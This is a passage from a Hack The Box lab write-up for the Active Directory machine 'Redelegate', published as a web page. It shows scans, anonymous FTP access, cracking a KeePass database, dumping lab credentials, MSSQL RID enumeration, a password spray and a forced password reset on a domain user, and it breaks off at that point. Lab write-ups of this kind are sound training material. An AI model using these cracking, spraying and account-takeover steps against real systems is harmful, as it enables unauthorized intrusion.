@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Redelegate | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), HTTP (80), SMB (445)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Redelegate" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), HTTP (80), SMB (445)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/og.png?v=908bd8bd" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Redelegate" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), HTTP (80), SMB (445)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/og.png?v=908bd8bd" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Redelegate","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), HTTP (80), SMB (445).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Redelegate","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-redelegate/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Redelegate</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 14 min read</p><h1>Redelegate</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), HTTP (80), SMB (445).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Redelegate" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-redelegate.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head"><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Redelegate</h2></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div></dl><p class="room-link"><a href="https://app.hackthebox.com/machines/Redelegate" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.234.50 --generate-hosts-file /etc/hosts                                  
+[sudo] password for kali: 
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><p>This has added an entry into /etc/hosts</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.234.50                                                            
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 15:37 +0000
+Nmap scan report for 10.129.234.50
+Host is up (0.016s latency).
+Not shown: 65507 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+61025/tcp open  unknown
+64959/tcp open  unknown
+64960/tcp open  unknown
+64966/tcp open  unknown
+64976/tcp open  unknown
+64978/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT dc.redelegate.vl
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 15:40 +0000
+Nmap scan report for dc.redelegate.vl (10.129.234.50)
+Host is up (0.015s latency).
+rDNS record for 10.129.234.50: DC.redelegate.vl
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 10-20-24  01:11AM                  434 CyberAudit.txt
+| 10-20-24  05:14AM                 2622 Shared.kdbx
+|_10-20-24  01:26AM                  580 TrainingAgenda.txt
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 15:40:26Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=dc.redelegate.vl
+| Not valid before: 2026-03-21T15:36:18
+|_Not valid after:  2026-09-20T15:36:18
+|_ssl-date: 2026-03-22T15:40:40+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: REDELEGATE
+|   NetBIOS_Domain_Name: REDELEGATE
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: redelegate.vl
+|   DNS_Computer_Name: dc.redelegate.vl
+|   DNS_Tree_Name: redelegate.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-22T15:40:32+00:00
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%), Windows Server 2019 (90%), Microsoft Windows 10 1909 - 2004 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>Looks like ive got anonymous FTP access</p><h2>FTP (21)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ftp dc.redelegate.vl
+Connected to DC.redelegate.vl.
+220 Microsoft FTP Service
+Name (dc.redelegate.vl:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||56810|)
+125 Data connection already open; Transfer starting.
+10-20-24  01:11AM                  434 CyberAudit.txt
+10-20-24  05:14AM                 2622 Shared.kdbx
+10-20-24  01:26AM                  580 TrainingAgenda.txt
+226 Transfer complete.
+ftp&gt; </code></pre><p>Found some interesting stuff</p><p>Ill transfer all this to my machine, i can do this with <code>mget</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat TrainingAgenda.txt 
+EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)
+
+Friday 4th October  | 14.30 - 16.30 - 53 attendees
+&quot;Don&#39;t take the bait&quot; - How to better understand phishing emails and what to do when you see one
+
+
+Friday 11th October | 15.30 - 17.30 - 61 attendees
+&quot;Social Media and their dangers&quot; - What happens to what you post online?
+
+
+Friday 18th October | 11.30 - 13.30 - 7 attendees
+&quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password 
+
+
+Friday 25th October | 9.30 - 12.30 - 29 attendees
+&quot;What now?&quot; - Consequences of a cyber attack and how to mitigate them</code></pre><p>Found a potential password <code>SeasonYear!</code> hint</p><p>Ill use AI to generate me a wordlist</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kpcli --kdb Shared.kdbx
+Provide the master password: </code></pre><p>As seen here is requires a master password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">keepass2john ftp/Shared.kdbx | tee -a Shared.kdbx.hash
+Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca4e19</code></pre><p>This has generate me a hash to crack</p><p>This still isnt working</p><p>After doing some research i found that from FTP you should always install the binary</p><p>This may be the issue is that the file itself is corrupted</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ftp&gt; bin
+200 Type set to I.
+ftp&gt; get Shared.kdbx
+local: Shared.kdbx remote: Shared.kdbx
+229 Entering Extended Passive Mode (|||54798|)
+125 Data connection already open; Transfer starting.
+100% |***********************************************************************|  2622       33.13 KiB/s    00:00 ETA
+226 Transfer complete.
+2622 bytes received in 00:00 (33.09 KiB/s)</code></pre><p>I chnaged the mode and re downloaded it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">keepass2john Shared.kdbx &gt; ../kdbx.hash</code></pre><p>Now i can try to crack it again......</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">john kdbx.hash --wordlist=seasonyear.txt                                          
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 600000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Fall2024!        (Shared)     
+1g 0:00:00:01 DONE (2026-03-22 17:01) 0.9009g/s 49.54p/s 49.54c/s 49.54C/s Autumn2021!..Winter2025!
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><p>Now its cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kpcli --kdb ftp/Shared.kdbx            
+Provide the master password: *************************
+
+KeePass CLI (kpcli) v3.8.1 is ready for operation.
+Type &#39;help&#39; for a description of available commands.
+Type &#39;help &lt;command&gt;&#39; for details on individual commands.
+
+kpcli:/&gt;</code></pre><p>Now i have access to the database</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kpcli:/Shared&gt; ls
+=== Groups ===
+Finance/
+HelpDesk/
+IT/
+kpcli:/Shared&gt; cd Finance/
+kpcli:/Shared/Finance&gt; ls
+=== Entries ===
+0. Payrol App                                                             
+1. Timesheet Manager                                                      
+kpcli:/Shared/Finance&gt; show -a 0
+
+Title: Payrol App
+Uname: Payroll
+ Pass: cVkqz4bCM7kJRSNlgx2G
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:13:50
+Modif: 2024-10-20 12:14:11
+Xpire: Never
+
+kpcli:/Shared/Finance&gt; show -a 1
+
+Title: Timesheet Manager
+Uname: Timesheet
+ Pass: hMFS4I0Kj8Rcd62vqi5X
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:13:30
+Modif: 2024-10-20 12:14:18
+Xpire: Never
+
+kpcli:/Shared/Finance&gt; cd ../HelpDesk/
+kpcli:/Shared/HelpDesk&gt; ls
+=== Entries ===
+0. KeyFob Combination                                                     
+kpcli:/Shared/HelpDesk&gt; show -a 0
+
+Title: KeyFob Combination
+Uname: 
+ Pass: 22331144
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 12:12:09
+Modif: 2024-10-20 12:12:32
+Xpire: Never
+
+kpcli:/Shared/HelpDesk&gt; cd ../IT/
+kpcli:/Shared/IT&gt; ls
+=== Entries ===
+0. FS01 Admin                                                             
+1. FTP                                                                    
+2. SQL Guest Access                                                       
+3. WEB01                                                                  
+kpcli:/Shared/IT&gt; show -a 0
+
+Title: FS01 Admin
+Uname: Administrator
+ Pass: Spdv41gg4BlBgSYIW1gF
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 07:57:02
+Modif: 2024-10-20 07:57:21
+Xpire: Never
+
+kpcli:/Shared/IT&gt; show -a 1
+
+Title: FTP
+Uname: FTPUser
+ Pass: SguPZBKdRyxWzvXRWy6U
+  URL: 
+Notes: Deprecated
+Icon#: 0
+Creat: 2024-10-20 07:56:20
+Modif: 2024-10-20 07:56:58
+Xpire: Never
+
+kpcli:/Shared/IT&gt; show -a 2
+
+Title: SQL Guest Access
+Uname: SQLGuest
+ Pass: zDPBpaF4FywlqIv11vii
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 08:26:48
+Modif: 2024-10-20 08:27:09
+Xpire: Never
+
+kpcli:/Shared/IT&gt; show -a 3
+
+Title: WEB01
+Uname: WordPress Panel
+ Pass: cn4KOEgsHqvKXPjEnSD9
+  URL: 
+Notes: 
+Icon#: 0
+Creat: 2024-10-20 07:57:24
+Modif: 2024-10-20 08:00:25
+Xpire: Never
+
+kpcli:/Shared/IT&gt;</code></pre><p>I now have a bunch of passwords</p><p>Ill put all these into a passwords file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cVkqz4bCM7kJRSNlgx2G
+hMFS4I0Kj8Rcd62vqi5X
+22331144
+Spdv41gg4BlBgSYIW1gF
+SguPZBKdRyxWzvXRWy6U
+zDPBpaF4FywlqIv11vii
+cn4KOEgsHqvKXPjEnSD9</code></pre><p>I can now continue with my enumeration</p><h2>HTTP (80)</h2><p>It appears to be just a default IIS server</p><p>After searching for subdomains and hidden directories i found nothing so ill move on from here</p><h2>SMB (445)</h2><p>Null auth is enabled but cannot use it to find users or list shares</p><p>Guest account is disabled</p><h2>LDAP (389)</h2><p>No anonymous bind</p><p>Not able to do anything with LDAP</p><p>Now after reviewing where the creds go i see that port 1433 is open and NMAP MISSED IT!</p><h2>MS-SQL (1433)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQLGuest:zDPBpaF4FywlqIv11vii</code></pre><p>Ill try these creds on this service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc mssql dc.redelegate.vl -u &#39;SQLGuest&#39; -p &#39;zDPBpaF4FywlqIv11vii&#39; --local-auth
+MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
+MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii</code></pre><p>I can access this service as this user</p><p>Looks like xp_cmdshell is disabled</p><p>Ill log in using mssqlclient.py from impacket</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mssqlclient.py redelegate.vl/&#39;SQLGuest&#39;:&#39;zDPBpaF4FywlqIv11vii&#39;@dc.redelegate.vl
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SQLGuest  guest@master)&gt; select name from master..sysdatabases;
+name     
+------   
+master   
+tempdb   
+model    
+msdb     
+SQL (SQLGuest  guest@master)&gt; </code></pre><p>These are just default DBs</p><p>Ill still have a look through</p><h3>Dumping users and groups</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf auxiliary(admin/mssql/mssql_enum_domain_accounts) &gt; run
+[*] Running module against 10.129.234.50
+[*] 10.129.234.50:1433 - Attempting to connect to the database server at 10.129.234.50:1433 as SQLGuest...
+[+] 10.129.234.50:1433 - Connected.
+[*] 10.129.234.50:1433 - SQL Server Name: WIN-Q13O908QBPG
+[*] 10.129.234.50:1433 - Domain Name: REDELEGATE
+[+] 10.129.234.50:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
+[*] 10.129.234.50:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
+[*] 10.129.234.50:1433 -  - WIN-Q13O908QBPG\Administrator
+[*] 10.129.234.50:1433 -  - REDELEGATE\Guest
+[*] 10.129.234.50:1433 -  - REDELEGATE\krbtgt
+[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Admins
+[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Users
+[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Guests
+[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Computers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Controllers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Cert Publishers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Schema Admins
+[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Admins
+[*] 10.129.234.50:1433 -  - REDELEGATE\Group Policy Creator Owners
+[*] 10.129.234.50:1433 -  - REDELEGATE\Read-only Domain Controllers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Cloneable Domain Controllers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Protected Users
+[*] 10.129.234.50:1433 -  - REDELEGATE\Key Admins
+[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Key Admins
+[*] 10.129.234.50:1433 -  - REDELEGATE\RAS and IAS Servers
+[*] 10.129.234.50:1433 -  - REDELEGATE\Allowed RODC Password Replication Group
+[*] 10.129.234.50:1433 -  - REDELEGATE\Denied RODC Password Replication Group
+[*] 10.129.234.50:1433 -  - REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
+[*] 10.129.234.50:1433 -  - REDELEGATE\DC$
+[*] 10.129.234.50:1433 -  - REDELEGATE\FS01$
+[*] 10.129.234.50:1433 -  - REDELEGATE\Christine.Flanders
+[*] 10.129.234.50:1433 -  - REDELEGATE\Marie.Curie
+[*] 10.129.234.50:1433 -  - REDELEGATE\Helen.Frost
+[*] 10.129.234.50:1433 -  - REDELEGATE\Michael.Pontiac
+[*] 10.129.234.50:1433 -  - REDELEGATE\Mallory.Roberts
+[*] 10.129.234.50:1433 -  - REDELEGATE\James.Dinkleberg
+[*] 10.129.234.50:1433 -  - REDELEGATE\Helpdesk
+[*] 10.129.234.50:1433 -  - REDELEGATE\IT
+[*] 10.129.234.50:1433 -  - REDELEGATE\Finance
+[*] 10.129.234.50:1433 -  - REDELEGATE\DnsAdmins
+[*] 10.129.234.50:1433 -  - REDELEGATE\DnsUpdateProxy
+[*] 10.129.234.50:1433 -  - REDELEGATE\Ryan.Cooper
+[*] 10.129.234.50:1433 -  - REDELEGATE\sql_svc</code></pre><p>Here ive dumped the users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sql_svc
+ryan.cooper
+james.dinkleberg
+mallory.roberts
+michael.pontiac
+helen.frost
+marie.curie
+christine.flanders
+FS01$
+DC01$
+Guest
+krbtgt
+Administrator</code></pre><p>I can now use this to enumerate further</p><h2>Password spray leads to user compromise</h2><p>So i have all the passwords in a file and now a user list so ill do a password spray</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.redelegate.vl -u users.txt -p passwords.txt --continue-on-success
+
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\marie.curie:Fall2024!</code></pre><p>Found a valid user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.redelegate.vl -u &#39;marie.curie&#39; -p &#39;Fall2024!&#39; --shares            
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\marie.curie:Fall2024! 
+SMB         10.129.234.50   445    DC               [*] Enumerated shares
+SMB         10.129.234.50   445    DC               Share           Permissions     Remark
+SMB         10.129.234.50   445    DC               -----           -----------     ------
+SMB         10.129.234.50   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.50   445    DC               C$                              Default share
+SMB         10.129.234.50   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.50   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.50   445    DC               SYSVOL          READ            Logon server share</code></pre><p>No interesting permissions on shares</p><p>At this point i think it might be a good idea to get bloodhound data</p><p>This user does not have access over winrm or RDP</p><h2>Bloodhound</h2><p><img src="images/redelegate/pasted-image-20260406002854.webp" alt="Screenshot" loading="lazy" /> I have ForceChangePassword over several different users which means these users are all compromised</p><p><img src="images/redelegate/pasted-image-20260406002905.webp" alt="Screenshot" loading="lazy" /> This is the most interesting user, all the others have no interesting groups and no outbound object control</p><h2>Compromising <code>helen.frost</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc password &quot;helen.frost&quot; &#39;Password123!&#39; -U &quot;redelegate.vl&quot;/&quot;marie.curie&quot;%&#39;Fall2024!&#39; -S &quot;dc.redelegate.vl&quot;</code></pre><p>This changed the users password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.redelegate.vl -u helen.frost -p &#39;Password123!&#39;                   
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
